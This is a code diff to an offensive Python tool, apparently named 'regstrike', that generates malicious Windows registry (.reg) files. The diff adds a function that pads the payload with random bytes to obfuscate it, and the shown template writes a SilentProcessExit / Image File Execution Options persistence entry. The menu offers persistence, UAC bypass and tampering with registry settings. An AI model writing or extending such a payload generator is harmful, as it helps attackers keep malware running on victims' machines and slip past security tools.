@@ -1,3 +1,4 @@
+from os import urandom
 
 regstrike_banner = """
       ___          ___ _       _ _        
@@ -20,6 +21,7 @@ template_run = r"""
 template_spe = r"""
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{0}]
 "GlobalFlag"=dword:00000200
+
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{0}]
 "ReportingMode"=dword:00000001
 "MonitorProcess"="{1}"
@@ -154,8 +156,20 @@ def mess_with_registry():
     pass
 
 
-def add_obfuscation():
-    pass
+def add_obfuscation(obf_length):
+    global payload
+    obfuscated_payload = b""
+    splited_payload = payload.split("\n")[1:]
+    obf_len_per_line = int(obf_length / splited_payload.count(""))
+
+    for splited in splited_payload:
+        if splited == "":
+            obfuscated_payload += (b"\n" + urandom(obf_len_per_line) + b"\n")
+        else:
+            if splited.startswith('"'):
+                splited = "\n" + splited
+            obfuscated_payload += splited.encode()
+    return obfuscated_payload
 
 
 def print_payload():
@@ -167,14 +181,18 @@ def reset_payload():
     payload = payload_prefix
     print("[+] Payload reset")
 
+
 def save_payload():
-    global reg_filename, payload
+    global reg_filename
+    print(f"[>] How many KB of obfuscation to add (0 for none)")
+    obf_length = int(input(">> ")) * 1024
+    obf_payload = add_obfuscation(obf_length)
     print(f"[>] Enter output file: (ENTER for default: {reg_filename})")
     alt_filename = input(">> ")
     if alt_filename != "":
         reg_filename = alt_filename
-    with open(reg_filename, "wt") as f:
-        f.write(payload)
+    with open(reg_filename, "wb") as f:
+        f.write(obf_payload)
         print(f"[+] Payload saved as {reg_filename}")
 
 
@@ -182,12 +200,11 @@ def main_screen():
     while True:
         print("[>] Choose:")
         print("[1] Add persistence")
-        print("[2] Add Run key persistence with UAC bypass")
+        print("[2] Add persistence with UAC bypass")
         print("[3] Mess with registry settings")
-        print("[4] Add obfuscation (recommended to do after all functionalities were added)")
-        print("[5] Print payload")
-        print("[6] Reset payload")
-        print("[7] Save payload")
+        print("[4] Print payload")
+        print("[5] Reset payload")
+        print("[6] Save payload")
         print("[99] Exit")
         i = int(input(">> "))
         if i == 1:
@@ -197,12 +214,10 @@ def main_screen():
         elif i == 3:
             mess_with_registry()
         elif i == 4:
-            add_obfuscation()
-        elif i == 5:
             print_payload()
-        elif i == 6:
+        elif i == 5:
             reset_payload()
-        elif i == 7:
+        elif i == 6:
             save_payload()
         elif i == 99:
             return
@@ -213,4 +228,3 @@ def main_screen():
 if __name__ == '__main__':
     print(regstrike_banner)
     main_screen()
-    
